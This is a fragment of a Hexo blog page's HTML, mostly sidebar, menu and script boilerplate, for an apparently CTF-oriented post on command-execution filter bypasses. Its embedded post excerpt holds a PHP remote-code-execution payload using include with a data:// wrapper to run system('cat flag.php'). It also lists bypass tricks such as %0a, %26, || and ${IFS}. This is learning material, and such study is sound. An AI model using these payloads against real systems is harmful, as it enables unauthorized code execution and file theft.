class="toc-item toc-level-3"><a class="toc-link" href="#ping%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BE%8B%E9%A2%98"><span class="toc-number">15.6.</span> <span class="toc-text"> ping命令执行例题</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">38</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">3</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "fuboy",
+          title: "命令执行绕过姿势",
+          url: "http://example.com/2025/03/04/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/",
+          excerpt: "",
+          description: "",
+          stripContent: " 小知识 12345include不用括号，分号可以用?&amp;gt;代替。 //c=include$_GET[1]?&amp;gt;&amp;amp;1=data://text/plain,&amp;lt;?php system(&amp;quot;cat flag.php&amp;quot;);?&amp;gt;若想截断后面语句：%0a、%26、||&amp;lt;、&amp;lt;&amp;gt;、$&amp;#123;IFS&amp;#125;可以绕过空格过滤  无过滤： 12345678910111213141516171819通配符payload1:c=system(&amp;quo",
+          date: "Tue Mar 04 2025 21:10:47 GMT+0800",
+          updated: "Tue Mar 11 2025 21:34:57 GMT+0800",
+          cover: "/../images/1737907114de8a.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+  </body>
+  </html>
+
